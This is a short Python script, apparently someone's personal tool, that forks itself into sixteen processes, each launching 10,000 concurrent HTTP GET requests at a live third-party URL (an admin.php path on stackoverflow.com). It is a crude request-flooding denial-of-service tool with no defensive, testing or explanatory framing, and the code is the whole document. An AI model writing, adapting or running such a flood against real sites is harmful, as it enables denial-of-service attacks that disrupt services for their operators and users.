import aiohttp
import asyncio
import os

os.fork()
os.fork()
os.fork()
os.fork()


url = "https://stackoverflow.com/admin.php?nisarg"  # Replace with a valid URL

i = 0

async def send_request(session):
    async with session.get(url) as response:
        global i
        i += 1
        print("Sent request", i, ":", response.status)

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(10000):
            tasks.append(send_request(session))
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    print('Hello Nisarg!')
    try:
        asyncio.run(main())
    except Exception as e:
        print("An error occurred:", str(e))